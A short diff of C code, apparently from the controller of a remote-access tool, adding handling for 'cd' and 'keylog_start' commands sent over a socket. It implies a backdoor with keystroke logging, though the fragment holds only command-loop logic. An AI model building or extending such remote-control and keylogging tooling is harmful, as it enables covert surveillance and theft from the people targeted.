@@ -49,6 +49,10 @@ int main() {
      if(strncmp("q", buffer, 1) == 0) {
        // quit command
        break;
+     } else if(strncmp("cd ", buffer, 3) == 0) {
+       goto jump;
+     } else if(strncmp("keylog_start ", buffer, 12) == 0) {
+       goto jump;
      } else {
        recv(client_socket, response, sizeof(response), MSG_WAITALL); // block ops until the full request is done
        // printing response
